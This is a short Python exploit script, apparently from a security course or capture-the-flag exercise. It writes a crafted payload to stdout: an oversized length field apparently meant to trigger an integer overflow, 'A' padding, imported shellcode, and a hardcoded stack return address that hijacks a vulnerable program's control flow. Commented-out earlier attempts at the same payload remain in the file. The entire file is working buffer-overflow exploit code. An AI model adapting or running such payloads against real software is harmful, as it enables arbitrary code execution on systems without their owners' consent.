from shellcode import shellcode
import sys
#sys.stdout.buffer.write(0x40000000.to_bytes(4, "little"))#b"x\00x\00x\00x\40") #+ (b"\x41" * 4))
#sys.stdout.buffer.write(0x1.to_bytes(4, "little") + 0x41414141.to_bytes(4, "little"))
sys.stdout.buffer.write(0x4000000f.to_bytes(4, "little") + 0x41414141.to_bytes(4, "little") + shellcode + 0x414141.to_bytes(3, "little") + (0x41414141.to_bytes(4, "little") * 12) + 0xfff6e8fc.to_bytes(4, "little"))
#sys.stdout.buffer.write(0x4000000e.to_bytes(4, "little") + (0x41414141.to_bytes(4, "little") * 68))# + 0xfff6e8f8.to_bytes(4, "little"))
#print(0x40000000.to_bytes(4, "little"))
#print(b"x\00x\00x\00x\40")
#print(type(0x40000000.to_bytes(4, "little")))
#print(type(b"x\00x\00x\00x\40"))